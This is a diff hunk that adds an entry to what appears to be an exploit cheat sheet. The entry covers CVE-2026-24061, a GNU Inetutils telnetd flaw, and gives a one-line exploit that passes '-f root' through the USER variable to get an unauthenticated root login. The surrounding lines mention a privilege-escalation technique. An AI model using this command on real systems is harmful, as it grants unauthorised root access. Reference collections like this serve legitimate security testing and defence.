@@ -9029,6 +9029,14 @@ Content-Disposition: form-data; name="2"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
+#### CVE-2026-24061: GNU Inetutils telnetd RCE
+
+- GNU InetUtils 1.9.3 > 2.7
+
+```console
+USER="-f root" telnet -a localhost
+```
+
 #### BadSuccessor Delegated Managed Service Account (dMSA) LPE
 
 > https://github.com/ibaiC/BadSuccessor
